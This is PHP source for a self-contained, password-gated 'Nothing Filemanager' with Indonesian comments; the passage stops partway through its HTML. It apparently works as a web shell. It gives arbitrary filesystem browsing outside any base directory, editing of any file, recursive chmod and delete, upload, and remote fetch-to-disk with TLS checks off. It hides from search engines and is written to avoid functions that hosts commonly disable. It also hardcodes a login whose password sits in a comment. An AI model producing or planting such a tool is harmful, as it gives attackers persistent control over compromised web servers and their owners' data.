<?php
/**
 * Nothing Filemanager — Tema Profesional + SVG Icons
 * Urutan aksi: Edit x Download x Rename x Chmod x Delete
 * - Tailwind (light), tombol biru, font Ubuntu (seragam).
 * - Fitur: listing, edit file (SEMUA FILE: Text / Base64), download, rename, chmod (opsional rekursif),
 *          delete (rekursif), mass delete (checkbox), upload file (multi-metode),
 *          upload via URL (multi-metode)
 * - Login: username + password (bcrypt). Cegah indexing mesin pencari.
 * - Keamanan: CSRF token untuk POST, path join aman, sanitasi entry ZIP, tanpa shell exec.
 * - Kompatibilitas: PHP 5.x sampai terbaru (tanpa strict typing; ada fallback random_bytes & password_verify)
 *
 * Catatan: Tidak menggunakan fungsi terlarang berikut:
 * stream_socket_client, ini_restore, gzinflate, exec, passthru, shell_exec, system, proc_open, popen,
 * parse_ini_file, show_source, scandir, posix_getpwuid, posix_getgrgid, diskfreespace, filegroup,
 * ftp_connect, stream_get_contents
 */

date_default_timezone_set(@date_default_timezone_get() ? @date_default_timezone_get() : 'UTC');
session_start();
if (empty($_SESSION['csrf'])) $_SESSION['csrf'] = bin2hex(biru_random_bytes(16));

/* ====== Anti Indexing + Security Headers ====== */
header('X-Robots-Tag: noindex, nofollow, noarchive, nosnippet, noimageindex', true);
header('Referrer-Policy: no-referrer');
header('X-Frame-Options: DENY');
header('Cache-Control: no-store, no-cache, must-revalidate, max-age=0');
header('Pragma: no-cache');
header('Expires: 0');

/* ====== AUTH CONFIG (ganti sesuai kebutuhan) ======
 * Disarankan: isi AUTH_PASS_HASH dengan bcrypt hash (PHP >= 5.5) atau buat di mesin lain.
 *   Contoh buat hash: php -r "echo password_hash('passwordku', PASSWORD_BCRYPT), PHP_EOL;"
 */
define('AUTH_USER', 'nothing');
define('AUTH_PASS_HASH', '$2a$12$POa5doGZ.KOsdjtBlmPZO.G.K1WHww7KqqHhBSmL9/sYKLBuPFCuO'); // pass : n0t

/* ========================== HELPERS ========================== */

function h($s) { return htmlspecialchars($s, ENT_QUOTES, 'UTF-8'); }

function biru_random_bytes($len) {
  if (function_exists('random_bytes')) {
    return random_bytes($len);
  }
  if (function_exists('openssl_random_pseudo_bytes')) {
    $strong = false;
    $b = openssl_random_pseudo_bytes($len, $strong);
    if ($b !== false && $strong) return $b;
  }
  // Fallback sederhana (tidak kriptografis, tapi cukup untuk CSRF non-kritis)
  $out = '';
  for ($i=0; $i<$len; $i++) {
    $out .= chr(mt_rand(0,255));
  }
  return $out;
}

function humanSize($b) {
  $u = array('B','KB','MB','GB','TB'); $i=0;
  while ($b >= 1024 && $i < count($u)-1) { $b/=1024; $i++; }
  return ($i ? number_format($b,2) : (string)$b).' '.$u[$i];
}

function permsToString($f) {
  $p = @fileperms($f); if ($p === false) return '??????????';
  $t = ($p & 0x4000) ? 'd' : (($p & 0xA000) ? 'l' : '-');
  $r = function($p,$r,$w,$x){ $s=''; $s.=($p&$r)?'r':'-'; $s.=($p&$w)?'w':'-'; $s.=($p&$x)?'x':'-'; return $s; };
  return $t.$r($p,0x0100,0x0080,0x0040).$r($p,0x0020,0x0010,0x0008).$r($p,0x0004,0x0002,0x0001);
}

function modeFromInput($s) {
  $s = trim($s); if ($s==='') return 0644;
  if (ctype_digit($s)) { if ($s[0] !== '0') $s = '0'.$s; return intval($s,8); }
  return 0644;
}

function isTextFile($p) {
  if (is_dir($p) || !is_file($p)) return false;
  $ext = strtolower(pathinfo($p, PATHINFO_EXTENSION));
  $text = array('txt','md','json','js','ts','css','scss','less','html','htm','xml','svg','php','phtml','inc','ini','cfg','env','yml','yaml','py','rb','go','rs','c','h','cpp','hpp','java','kt','sql','csv','log');
  if (in_array($ext, $text, true)) return true;
  $s = @file_get_contents($p, false, null, 0, 2048); if ($s === false) return false;
  return (bool)preg_match('//u', $s);
}

function safeJoin($base, $child) {
  $child = str_replace("\0", '', $child);
  if ($child === '') return $base;
  if ($child[0] === DIRECTORY_SEPARATOR || preg_match('~^[A-Za-z]:\\\\~', $child)) return $child;
  return rtrim($base, DIRECTORY_SEPARATOR).DIRECTORY_SEPARATOR.$child;
}

/* ====== PENGGANTI scandir(): opendir()/readdir() ====== */
function listDirEntries($dir) {
  $h = @opendir($dir);
  if ($h === false) return array();
  $items = array();
  while (false !== ($e = readdir($h))) {
    if ($e === '.' || $e === '..') continue;
    $items[] = $e;
  }
  closedir($h);
  return $items;
}

/* ====== HAPUS REKURSIF ====== */
function rrmdir($p) {
  if (!file_exists($p)) return true;
  if (is_file($p) || is_link($p)) return @unlink($p);
  $ok = true;
  $h = @opendir($p);
  if ($h === false) return false;
  while (false !== ($v = readdir($h))) {
    if ($v === '.' || $v === '..') continue;
    $ok = rrmdir($p.DIRECTORY_SEPARATOR.$v) && $ok;
  }
  closedir($h);
  return @rmdir($p) && $ok;
}

/* ====== UPLOAD HELPER ====== */
function tryWriteFromTmp($tmp, $dest) {
  $err = array();
  if (@move_uploaded_file($tmp, $dest)) return array(true, null); $err[]='move_uploaded_file';
  if (@rename($tmp, $dest))             return array(true, null); $err[]='rename';
  if (@copy($tmp, $dest))               return array(true, null); $err[]='copy';
  $d = @file_get_contents($tmp);
  if ($d !== false && @file_put_contents($dest, $d) !== false) return array(true, null); $err[]='get+put';
  $in = @fopen($tmp, 'rb'); $out = @fopen($dest, 'wb');
  if ($in && $out) { $c = stream_copy_to_stream($in, $out); @fclose($in); @fclose($out); if ($c !== false) return array(true, null); $err[]='stream_copy'; }
  else $err[]='fopen';
  return array(false, implode('; ', $err).' gagal');
}

/* ====== UNDUH DARI URL (tanpa fungsi terlarang) ====== */
function fetchUrlToFile($url, $dest) {
  $errs = array();
  if (function_exists('curl_init')) {
    $ch = curl_init($url); $fp = @fopen($dest, 'wb');
    if ($ch && $fp) {
      curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
      curl_setopt($ch, CURLOPT_FILE, $fp);
      curl_setopt($ch, CURLOPT_FAILONERROR, true);
      curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (FileManager/1.1)');
      curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
      curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
      curl_setopt($ch, CURLOPT_TIMEOUT, 60);
      $ok = curl_exec($ch); $e = curl_error($ch); curl_close($ch); fclose($fp);
      if ($ok) return array(true, null); $errs[] = 'cURL: '.$e; @unlink($dest);
    } else {
      if ($ch) curl_close($ch);
      if ($fp) fclose($fp);
      $errs[] = 'init cURL/fopen';
    }
  }
  $ctx = stream_context_create(array(
    'http' => array('follow_location' => 1, 'timeout' => 60, 'header' => "User-Agent: Mozilla/5.0\r\n"),
    'ssl'  => array('verify_peer' => false, 'verify_peer_name' => false)
  ));
  // Catatan: kita TIDAK memakai stream_get_contents (terlarang); pakai copy/file_get_contents.
  if (@copy($url, $dest, $ctx)) return array(true, null); $errs[]='copy(url)';
  $d = @file_get_contents($url, false, $ctx);
  if ($d !== false && @file_put_contents($dest, $d) !== false) return array(true, null); $errs[]='get+put';
  $in = @fopen($url, 'rb', false, $ctx); $out = @fopen($dest, 'wb');
  if ($in && $out) { $c = stream_copy_to_stream($in, $out); @fclose($in); @fclose($out); if ($c !== false) return array(true, null); $errs[]='stream_copy'; @unlink($dest); }
  else $errs[] = 'fopen(url/dest)';
  return array(false, implode('; ', $errs).' gagal');
}

function breadcrumbs($path) {
  $out = array();
  if (preg_match('~^[A-Za-z]:\\\\~', $path)) {
    $drive = substr($path,0,2); $rest = substr($path,2);
    $seg = array_values(array_filter(explode('\\',$rest),'strlen'));
    $acc = $drive.'\\'; $out[] = array($drive.'\\', $acc);
    foreach ($seg as $s) { $acc .= $s.'\\'; $out[] = array($s, rtrim($acc,'\\')); }
  } else {
    $seg = array_values(array_filter(explode('/',$path),'strlen'));
    $acc = '/'; $out[] = array('/','/');
    foreach ($seg as $s) { $acc .= $s.'/'; $out[] = array($s, rtrim($acc,'/')); }
  }
  return $out;
}

function ensureCsrf() {
  if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $sess = isset($_SESSION['csrf']) ? $_SESSION['csrf'] : '';
    $tok  = isset($_POST['csrf']) ? (string)$_POST['csrf'] : '';
    // hash_equals mungkin tidak ada di PHP 5.5-, fallback:
    $ok = function_exists('hash_equals') ? hash_equals($sess, $tok) : ($sess === $tok);
    if (!$ok) { http_response_code(400); exit('CSRF token invalid'); }
  }
}

/* ====== LOGIN RENDER ====== */
function render_login($err='') {
  $csrf = isset($_SESSION['csrf']) ? $_SESSION['csrf'] : '';
  ?>
  <!doctype html>
  <html lang="id">
  <head>
    <meta charset="utf-8">
    <title>Login &ndash; Nothing Filemanager</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="robots" content="noindex,nofollow,noarchive,nosnippet,noimageindex">
    <meta name="googlebot" content="noindex,nofollow,noarchive,nosnippet,noimageindex">
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=Ubuntu:wght@300;400;500;700&display=swap" rel="stylesheet">
    <style>
      html,body{ height:100%; }
      body{ font-family:'Ubuntu',system-ui,-apple-system,Segoe UI,Roboto,"Helvetica Neue",Arial,"Noto Sans"; }
      .card{ background:#fff;border:1px solid #e5e7eb;border-radius:16px;box-shadow:0 8px 24px rgba(0,0,0,.06); }
      .btn{ background:#2563eb;color:#fff;border-radius:10px;padding:.6rem .9rem;font-weight:600; }
      .btn:hover{ background:#1d4ed8; }
      .field{ border:1px solid #e5e7eb;border-radius:10px;padding:.55rem .75rem;width:100%; }
      .field:focus{ outline:none;box-shadow:0 0 0 4px rgba(37,99,235,.15);border-color:#93c5fd; }
    </style>
  </head>
  <body class="min-h-screen bg-gradient-to-b from-white to-slate-50 flex items-center justify-center p-6">
    <div class="w-full max-w-md card p-6">
      <div class="mb-4">
        <h1 class="text-xl font-semibold">Nothing Filemanager</h1>
        <p class="text-sm text-gray-500">Silakan login untuk melanjutkan.</p>
      </div>
      <?php if ($err): ?>
        <div class="mb-3 rounded-lg border border-red-200 bg-red-50 text-red-800 px-3 py-2">
          <?php echo h($err); ?>
        </div>
      <?php endif; ?>
      <form method="post" action="?a=login">
        <input type="hidden" name="csrf" value="<?php echo h($csrf); ?>">
        <div class="space-y-3">
          <div>
            <label class="text-sm text-gray-700">Username</label>
            <input class="field" name="user" type="text" autocomplete="username" required>
          </div>
          <div>
            <label class="text-sm text-gray-700">Password</label>
            <input class="field" name="pass" type="password" autocomplete="current-password" required>
          </div>
          <button class="btn w-full" type="submit">Login</button>
        </div>
      </form>
      <p class="text-[12px] text-gray-500 mt-4">PHP <?php echo h(PHP_VERSION); ?> x indexing dinonaktifkan</p>
    </div>
  </body>
  </html>
  <?php
}

/* ====== AUTH HELPERS ====== */
function biru_password_verify($password, $hash) {
  if (function_exists('password_verify')) {
    return password_verify($password, $hash);
  }
  // Fallback: untuk bcrypt ($2y$...) gunakan crypt
  if (strlen($hash) >= 60 && ($hash[0].$hash[1]) === '$2') {
    return crypt($password, $hash) === $hash;
  }
  // Bila bukan bcrypt, matikan (demi keamanan)
  return false;
}

function verify_login_creds($u, $p) {
  if ($u !== AUTH_USER) return false;
  $hash = AUTH_PASS_HASH;
  if ($hash === '' || strlen($hash) < 20) {  // safety: jangan izinkan login tanpa hash valid
    return false;
  }
  return biru_password_verify($p, $hash);
}


/* ======================= SVG ICONS ======================= */
function svgIcon($name, $class='ico') {
  $icons = array(
    'folder' => '<svg viewBox="0 0 24 24" class="'.$class.'" aria-hidden="true"><path d="M10 4l2 2h6a2 2 0 012 2v1H4V6a2 2 0 012-2h4z" fill="currentColor" opacity=".12"/><path d="M3 9h18v9a2 2 0 01-2 2H5a2 2 0 01-2-2V9z" fill="currentColor"/></svg>',
    'file'   => '<svg viewBox="0 0 24 24" class="'.$class.'" aria-hidden="true"><path d="M6 3h7l5 5v11a2 2 0 01-2 2H6a2 2 0 01-2-2V5a2 2 0 012-2z" fill="currentColor" opacity=".12"/><path d="M13 3v5a2 2 0 002 2h5" fill="none" stroke="currentColor" stroke-width="2" stroke-linejoin="round"/></svg>',
    'code'   => '<svg viewBox="0 0 24 24" class="'.$class.'"><path d="M8 16l-4-4 4-4M16 8l4 4-4 4" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg>',
    'text'   => '<svg viewBox="0 0 24 24" class="'.$class.'"><path d="M4 6h16M4 12h16M4 18h10" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"/></svg>',
    'img'    => '<svg viewBox="0 0 24 24" class="'.$class.'"><path d="M4 5h16v14H4z" fill="currentColor" opacity=".12"/><circle cx="8.5" cy="9.5" r="1.5" fill="currentColor"/><path d="M4 16l4-4 3 3 3-2 6 5" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"/></svg>',
    'pdf'    => '<svg viewBox="0 0 24 24" class="'.$class.'"><path d="M6 3h7l5 5v11a2 2 0 01-2 2H6a2 2 0 01-2-2V5a2 2 0 012-2z" fill="currentColor" opacity=".12"/><text x="7" y="17" font-size="8" font-family="ui-sans-serif" fill="currentColor">PDF</text></svg>',
    'sheet'  => '<svg viewBox="0 0 24 24" class="'.$class.'"><path d="M6 3h12a2 2 0 012 2v14a2 2 0 01-2 2H6a2 2 0 01-2-2V5" fill="currentColor" opacity=".12"/><path d="M8 8h8M8 12h8M8 16h8" stroke="currentColor" stroke-width="2"/></svg>',
    'zip'    => '<svg viewBox="0 0 24 24" class="'.$class.'"><path d="M6 3h7l5 5v11a2 2 0 01-2 2H6a2 2 0 01-2-2V5" fill="currentColor" opacity=".12"/><path d="M11 5h2v2h-2v2h2v2h-2v2h2v2h-2" stroke="currentColor" stroke-width="2"/></svg>',
    'db'     => '<svg viewBox="0 0 24 24" class="'.$class.'"><ellipse cx="12" cy="6" rx="8" ry="3" fill="currentColor" opacity=".12"/><path d="M4 6v12c0 1.7 3.6 3 8 3s8-1.3 8-3V6" fill="none" stroke="currentColor" stroke-width="2"/></svg>',
  );
  return isset($icons[$name]) ? $icons[$name] : $icons['file'];
}

function iconSvgFor($p) {
  if (is_dir($p)) return svgIcon('folder');
  $e = strtolower(pathinfo($p, PATHINFO_EXTENSION));
  if (in_array($e, array('zip','rar','7z'))) return svgIcon('zip');
  if (in_array($e, array('jpg','jpeg','png','gif','webp','bmp','svg'))) return svgIcon('img');
  if (in_array($e, array('pdf'))) return svgIcon('pdf');
  if (in_array($e, array('csv','xls','xlsx'))) return svgIcon('sheet');
  if (in_array($e, array('sql'))) return svgIcon('db');
  if (in_array($e, array('php','js','ts','css','scss','less','html','htm','xml','yml','yaml','ini','cfg'))) return svgIcon('code');
  if (in_array($e, array('txt','md','log','json'))) return svgIcon('text');
  return svgIcon('file');
}

/* ================= PATH & ACTION ROUTING ================= */

$current = isset($_GET['p']) ? (string)$_GET['p'] : getcwd();
if (!is_dir($current)) $current = getcwd();
$current = rtrim($current, DIRECTORY_SEPARATOR);
if ($current === '') $current = DIRECTORY_SEPARATOR;

$action = isset($_GET['a']) ? $_GET['a'] : '';

/* ====== Auth Flow ====== */
if ($action === 'login' && $_SERVER['REQUEST_METHOD'] === 'POST') {
  ensureCsrf();
  $u = isset($_POST['user']) ? (string)$_POST['user'] : '';
  $p = isset($_POST['pass']) ? (string)$_POST['pass'] : '';
  if (verify_login_creds($u, $p)) {
    $_SESSION['auth'] = true;
    $_SESSION['who']  = $u;
    header('Location: ?p='.rawurlencode($current));
    exit;
  } else {
    render_login('Username atau password salah');
    exit;
  }
}
if (empty($_SESSION['auth'])) {
  render_login();
  exit;
}

/* ====== Download (setelah login) ====== */
if ($action === 'download') {
  $f = safeJoin($current, isset($_GET['f']) ? $_GET['f'] : '');
  if (!is_file($f) || !is_readable($f)) { http_response_code(404); exit('Not found'); }
  header('Content-Description: File Transfer');
  header('Content-Type: application/octet-stream');
  header('Content-Disposition: attachment; filename="'.basename($f).'"');
  header('Content-Length: '.filesize($f));
  header('X-Content-Type-Options: nosniff');
  readfile($f);
  exit;
}

/* ====== POST Actions (butuh login) ====== */
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
  ensureCsrf();
  $back = function() use ($current){ header('Location: ?p='.rawurlencode($current)); exit; };

  switch ($action) {
    case 'logout': {
      session_destroy();
      header('Location: ?');
      exit;
    }
    case 'edit-save': {
      $file = safeJoin($current, isset($_POST['file']) ? $_POST['file'] : '');
      $content = isset($_POST['content']) ? (string)$_POST['content'] : '';
      $mode = isset($_POST['mode']) ? $_POST['mode'] : 'txt'; // 'txt' | 'b64'
      if (!is_file($file) || !is_writable($file)) { $_SESSION['msg'] = 'Gagal simpan (tidak writable)'; return $back(); }

      if ($mode === 'b64') {
        $data = base64_decode($content, true);
        if ($data === false) {
          $_SESSION['msg'] = 'Gagal simpan: Base64 tidak valid';
          return $back();
        }
        @file_put_contents($file, $data);
      } else {
        @file_put_contents($file, $content);
      }
      $_SESSION['msg'] = 'Disimpan: '.basename($file);
      return $back();
    }
    case 'rename': {
      $old = safeJoin($current, isset($_POST['old']) ? $_POST['old'] : '');
      $new = trim(isset($_POST['new']) ? (string)$_POST['new'] : '');
      if ($new === '' || strpos($new, DIRECTORY_SEPARATOR) !== false) $_SESSION['msg']='Nama baru tidak valid';
      else {
        $dst = safeJoin($current, $new);
        $_SESSION['msg'] = @rename($old, $dst) ? 'Rename OK' : 'Rename gagal';
      }
      return $back();
    }
    case 'chmod': {
      $target = safeJoin($current, isset($_POST['target']) ? $_POST['target'] : '');
      $mode = modeFromInput(isset($_POST['mode']) ? (string)$_POST['mode'] : '0644');
      $rec = !empty($_POST['recursive']); $ok = true;
      biru_apply_chmod($target, $mode, $rec, $ok);
      $_SESSION['msg'] = $ok ? 'Chmod OK' : 'Sebagian chmod gagal';
      return $back();
    }
    case 'delete': {
      $t = safeJoin($current, isset($_POST['target']) ? $_POST['target'] : '');
      $_SESSION['msg'] = rrmdir($t) ? 'Hapus OK' : 'Hapus gagal';
      return $back();
    }
    case 'mass-delete': {
      $arr = isset($_POST['items']) ? $_POST['items'] : array(); $ok=true;
      if (is_array($arr)) foreach ($arr as $n) { $ok = rrmdir(safeJoin($current, $n)) && $ok; }
      $_SESSION['msg'] = $ok ? 'Hapus massal OK' : 'Sebagian gagal dihapus';
      return $back();
    }
    case 'upload': {
      if (!isset($_FILES['files'])) { $_SESSION['msg']='Tidak ada file'; return $back(); }
      $c = count($_FILES['files']['name']); $ok=0; $fail=0; $fails=array();
      for ($i=0; $i<$c; $i++) {
        $name = $_FILES['files']['name'][$i]; $tmp = $_FILES['files']['tmp_name'][$i]; $e = $_FILES['files']['error'][$i];
        if ($e !== UPLOAD_ERR_OK) { $fail++; $fails[] = "$name (error $e)"; continue; }
        list($done,$why) = tryWriteFromTmp($tmp, safeJoin($current, $name));
        if ($done) $ok++; else { $fail++; $fails[] = "$name ($why)"; }
      }
      $_SESSION['msg'] = "Upload: OK=$ok; Gagal=$fail".($fails ? '; '.implode(', ', $fails) : '');
      return $back();
    }
    case 'url-upload': {
      $url = trim(isset($_POST['url']) ? (string)$_POST['url'] : ''); $fn = trim(isset($_POST['filename']) ? (string)$_POST['filename'] : '');
      if ($url === '') { $_SESSION['msg'] = 'URL kosong'; return $back(); }
      if ($fn === '') { $fn = basename(parse_url($url, PHP_URL_PATH) ? parse_url($url, PHP_URL_PATH) : ''); if ($fn === '') $fn = 'download.bin'; }
      list($ok,$w) = fetchUrlToFile($url, safeJoin($current, $fn));
      $_SESSION['msg'] = $ok ? "URL terunduh: $fn" : "Gagal URL upload: $w";
      return $back();
    }
    /*case 'unzip': {
      // (opsional) unzip aman jika suatu saat diaktifkan
    }*/
  }
}

/* ====== Helper chmod rekursif (tanpa closure agar ramah PHP 5.2) ====== */
function biru_apply_chmod($path, $mode, $recursive, &$ok) {
  if (!@chmod($path, $mode)) $ok = false;
  if ($recursive && is_dir($path)) {
    $h = @opendir($path);
    if ($h !== false) {
      while (false !== ($v = readdir($h))) {
        if ($v === '.' || $v === '..') continue;
        biru_apply_chmod($path.DIRECTORY_SEPARATOR.$v, $mode, true, $ok);
      }
      closedir($h);
    } else {
      $ok = false;
    }
  }
}

/* ===================== DATA LISTING ===================== */
$items = listDirEntries($current);
$files = array(); $dirs = array();
foreach ($items as $it) {
  $full = $current.DIRECTORY_SEPARATOR.$it;
  if (is_dir($full)) $dirs[] = $it; else $files[] = $it;
}

/* Sorting natural case-insensitive jika tersedia, kalau tidak fallback */
$hasNatural = defined('SORT_NATURAL');
$hasFlagCase = defined('SORT_FLAG_CASE');
if ($hasNatural) {
  sort($dirs, $hasFlagCase ? (SORT_NATURAL|SORT_FLAG_CASE) : SORT_NATURAL);
  sort($files, $hasFlagCase ? (SORT_NATURAL|SORT_FLAG_CASE) : SORT_NATURAL);
} else {
  natcasesort($dirs); $dirs = array_values($dirs);
  natcasesort($files); $files = array_values($files);
}

$up = dirname($current); if ($up === $current) $up = $current;

$isEdit   = ((isset($_GET['a']) ? $_GET['a'] : '') === 'edit' && isset($_GET['f'])) ? safeJoin($current, $_GET['f']) : null;
$editFile = ($isEdit && is_file($isEdit)) ? $isEdit : null;

// Mode tampilan editor: 'txt' atau 'b64'. Default auto: text utk text file, base64 utk binary.
$modeParam = isset($_GET['mode']) ? $_GET['mode'] : 'auto';
$viewMode  = in_array($modeParam, array('txt','b64','auto'), true) ? $modeParam : 'auto';

$csrf = isset($_SESSION['csrf']) ? $_SESSION['csrf'] : '';
?>
<!doctype html>
<html lang="id">
<head>
  <meta charset="utf-8">
  <title>Nothing Filemanager</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <meta name="robots" content="noindex,nofollow,noarchive,nosnippet,noimageindex">
  <meta name="googlebot" content="noindex,nofollow,noarchive,nosnippet,noimageindex">
  <script src="https://cdn.tailwindcss.com"></script>
  <link href="https://fonts.googleapis.com/css2?family=Ubuntu:wght@300;400;500;700&display=swap" rel="stylesheet">
  <style>
    :root { color-scheme: light; }
    html,body{ height:100%; }
    body{ font-family:'Ubuntu',system-ui,-apple-system,Segoe UI,Roboto,"Helvetica Neue",Arial,"Noto Sans"; }
    .shell{ min-height:100vh; background:linear-gradient(180deg,#ffffff, #fbfcff); display:flex; flex-direction:column; }
    .card{ background:#fff;border:1px solid #e5e7eb;border-radius:16px;box-shadow:0 1px 2px rgba(0,0,0,.04); }
    .btn{ background:#2563eb;color:#fff;border-radius:10px;padding:.5rem .75rem;font-size:.875rem;line-height:1.25rem;font-weight:600; display:inline-flex; align-items:center; justify-content:center; text-decoration:none; transition:transform .05s ease, box-shadow .15s ease, background .15s ease; }
    .btn:hover{ background:#1d4ed8; box-shadow:0 4px 10px rgba(37,99,235,.25); }
    .btn:active{ transform:translateY(.5px); }
    .btn-xs{ padding:.25rem .5rem; font-size:.75rem; border-radius:8px; }
    .btn-sm{ padding:.35rem .6rem; font-size:.8125rem; border-radius:9px; }
    .btnw{ min-width:90px; }
    .placeholder{ visibility:hidden; }
    .field{ border:1px solid #e5e7eb;border-radius:10px;padding:.5rem .75rem;width:100%; background:#fff; }
    .field:focus{ outline:none;box-shadow:0 0 0 4px rgba(37,99,235,.15);border-color:#93c5fd; }
    .chip{ display:inline-block;padding:.15rem .45rem;font-size:.65rem;border-radius:999px;background:#eff6ff;color:#1e40af;border:1px solid #bfdbfe; }
    .mono{ font-family:ui-monospace,SFMono-Regular,Menlo,Monaco,Consolas,"Liberation Mono","Courier New",monospace; }
    .tbl thead th{ position:sticky; top:0; background:#f8fafc; z-index:1; }
    .tbl tbody tr:hover{ background:#f8fafc; }
    .row-actions{
      display:grid;
      grid-template-columns: repeat(6, minmax(90px, auto));
      gap:.35rem;
      justify-items:start;
    }
    .row-actions > form{ display:inline; }
    @media (max-width: 1024px){
      .row-actions{ grid-template-columns: repeat(3, minmax(90px, auto)); }
    }
    .crumb a{ color:#1d4ed8; text-decoration:none; }
    .crumb a:hover{ text-decoration:underline; }
    .ico{ width:20px; height:20px; display:inline-block; vertical-align:text-bottom; color:#1f2937; }
    .name-cell{ display:flex; align-items:center; gap:.5rem; }
    .badge-small{ font-size:11px; padding:.1rem .4rem; border-radius:999px; background:#eef2ff; color:#3730a3; border:1px solid #c7d2fe; }
    .tab{ padding:.25rem .5rem; border:1px solid #e5e7eb; border-radius:8px; }
    .tab.active{ background:#2563eb; color:#fff; border-color:#2563eb; }
    .note{ font-size:.75rem; color:#6b7280; }
    .viewport{ flex:1; display:flex; flex-direction:column; }
    .tablewrap{ max-height: calc(100vh - 290px); overflow:auto; }
    @media (max-height: 700px){ .tablewrap{ max-height: calc(100vh - 340px); } }
  </style>
</head>
<body class="shell text-gray-900">

  <!-- HEADER -->
  <header class="w-full border-b bg-white/90 backdrop-blur">
    <div class="w-full px-6 py-3 flex items-center justify-between">
      <div class="flex items-center gap-3">
        <div class="text-2xl">
          <?php echo svgIcon('folder','ico'); ?>
        </div>
        <div>
          <div class="text-lg font-semibold tracking-tight">Nothing Filemanager</div>
          <div class="text-xs text-gray-500">PHP <?php echo h(PHP_VERSION); ?></div>
        </div>
      </div>
      <div class="flex items-center gap-3">
        <div class="text-sm text-gray-700">Path: <span class="mono"><?php echo h($current); ?></span></div>
        <form method="post" action="?a=logout&p=<?php echo rawurlencode($current); ?>" class="ml-2">
          <input type="hidden" name="csrf" value="<?php echo h($csrf); ?>">
          <button class="btn btn-sm" type="submit">Logout</button>
        </form>
      </div>
    </div>
  </header>

  <!-- MAIN -->
  <main class="viewport w-full px-6 py-4">

    <?php if (!empty($_SESSION['msg'])): ?>
      <div class="mb-4 rounded-lg border border-blue-200 bg-blue-50 text-blue-900 px-4 py-3">
        <?php echo h($_SESSION['msg']); unset($_SESSION['msg']); ?>
      </div>
    <?php endif; ?>

    <!-- Breadcrumbs -->
    <div class="crumb mb-4 text-sm flex items-center gap-2 flex-wrap">
      <?php foreach (breadcrumbs($current) as $i => $crumb): list($name,$path) = $crumb; ?>
        <?php if ($i) echo '<span class="text-gray-400">/</span>'; ?>
        <a href="?p=<?php echo rawurlencode($path); ?>" class="inline-flex items-center gap-1">
          <span class="px-2 py-0.5 bg-gray-100 rounded-md border text-gray-700"><?php echo h($name); ?></span>
        </a>
      <?php endforeach; ?>
    </div>

    <!-- Top Grid -->
    <div class="grid grid-cols-1 md:grid-cols-3 gap-4">
      <!-- Ganti Path -->
      <section class="md:col-span-1 space-y-4">
        <div class="card p-4">
          <h2 class="font-medium mb-2">Ganti Path</h2>
          <form method="get" class="space-y-2">
            <input type="text" name="p" class="field mono" placeholder="/home/user" value="<?php echo h($current); ?>">
            <div class="flex gap-2">
              <button class="btn btnw" type="submit">Go</button>
              <a class="btn btnw" href="?">Ke cwd()</a>
            </div>
          </form>
        </div>
      </section>

      <!-- Upload -->
      <section class="md:col-span-2">
        <div class="card p-4">
          <h2 class="font-medium mb-3">Upload ke: <span class="mono"><?php echo h($current); ?></span></h2>
          <div class="grid grid-cols-1 lg:grid-cols-2 gap-4">
            <form method="post" enctype="multipart/form-data" action="?a=upload&p=<?php echo rawurlencode($current); ?>" class="space-y-2">
              <input type="hidden" name="csrf" value="<?php echo h($csrf); ?>">
              <input type="file" name="files[]" multiple class="block">
              <button class="btn btnw" type="submit">Upload</button>
              <div class="text-xs text-gray-500">Fallback: move => rename => copy => get+put => stream copy.</div>
            </form>
            <form method="post" action="?a=url-upload&p=<?php echo rawurlencode($current); ?>" class="space-y-2">
              <input type="hidden" name="csrf" value="<?php echo h($csrf); ?>">
              <input type="url" name="url" class="field" placeholder="https://example.com/file.zip" required>
              <input type="text" name="filename" class="field" placeholder="Nama file (opsional)">
              <button class="btn btnw" type="submit">Ambil dari URL</button>
              <div class="text-xs text-gray-500">Metode: cURL => copy(stream) => get+put => stream copy.</div>
            </form>
          </div>
        </div>
      </section>
    </div>

    <!-- Editor -->
    <?php if ($editFile): ?>
      <?php
        $autoMode = ($viewMode === 'auto');
        if ($autoMode) $viewMode = isTextFile($editFile) ? 'txt' : 'b64';
        $rawContent = @file_get_contents($editFile);
        if ($rawContent === false) $rawContent = '';
        $display = ($viewMode === 'b64') ? base64_encode($rawContent) : $rawContent;
      ?>
      <section class="card p-4 mt-4">
        <div class="flex items-center justify-between gap-2">
          <h2 class="font-medium">Edit: <span class="mono"><?php echo h(basename($editFile)); ?></span></h2>
          <div class="note">Ukuran: <?php echo h(humanSize((int)@filesize($editFile))); ?> x Mode:
            <a class="tab <?php echo $viewMode==='txt'?'active':''; ?>" href="?a=edit&f=<?php echo rawurlencode(basename($editFile)); ?>&p=<?php echo rawurlencode($current); ?>&mode=txt">Text</a>
            <a class="tab <?php echo $viewMode==='b64'?'active':''; ?>" href="?a=edit&f=<?php echo rawurlencode(basename($editFile)); ?>&p=<?php echo rawurlencode($current); ?>&mode=b64">Base64</a>
          </div>
        </div>

        <form method="post" action="?a=edit-save&p=<?php echo rawurlencode($current); ?>">
          <input type="hidden" name="csrf" value="<?php echo h($csrf); ?>">
          <input type="hidden" name="file" value="<?php echo h(basename($editFile)); ?>">
          <input type="hidden" name="mode" value="<?php echo h($viewMode); ?>">
          <textarea name="content" class="w-full h-96 border border-gray-200 rounded-xl p-3 mono" spellcheck="false"><?php echo h($display); ?></textarea>
          <div class="mt-3 flex flex-wrap gap-2 items-center">
            <button class="btn btnw" type="submit">Simpan</button>
            <a class="btn btnw" href="?p=<?php echo rawurlencode($current); ?>">Batal</a>
            <?php if ($viewMode==='b64'): ?>
              <span class="note">Mode Base64: konten akan di-decode saat disimpan.</span>
            <?php else: ?>
              <span class="note">Mode Text: cocok untuk file teks. Untuk binary, gunakan Base64.</span>
            <?php endif; ?>
          </div>
        </form>
      </section>
    <?php endif; ?>

    <!-- Listing -->
    <section class="card p-4 mt-4 flex flex-col">
      <div class="flex items-center justify-between mb-3">
